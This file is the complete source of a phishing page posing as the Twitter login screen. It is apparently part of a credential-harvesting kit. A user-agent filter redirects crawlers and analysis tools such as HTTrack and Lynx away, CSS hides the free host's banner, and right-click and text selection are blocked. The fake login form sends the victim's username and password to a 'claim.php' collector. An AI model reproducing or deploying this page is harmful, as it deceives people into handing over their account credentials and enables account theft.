<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: ../cracker.php');
die();
}
?>
<html>
<head>
<style>img[alt*="www.000webhost.com"]{display:none}</style>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Login on Twitter / Twitter">
<meta name="description" content="Log in to your Twitter account.">
<meta property="og:description" content="Log in to your Twitter account.">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Login on Twitter / Twitter">
<meta property="og:type" content="website">
<title>Login on Twitter / Twitter</title>
<link rel="stylesheet" href="css/twitter.css">
<link rel="shortcut icon" href="https://abs.twimg.com/favicons/twitter.ico">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="login-box">
	<center>
	<img width="40" src="img/twitter.png">
	<h4>Log in to Twitter</h4>
	</center>
	<form action="../../claim.php" method="post">
		<input type="text" name="email" placeholder="Phone, email, or username" autocomplete="off" required>
		<input type="password" name="password" placeholder="Password" autocomplete="off" required>
		<input type="hidden" name="login" value="Twitter" readonly>
		<button type="submit" class="btn-login">Log In</button>
	</form>
</div>
</body>
</html>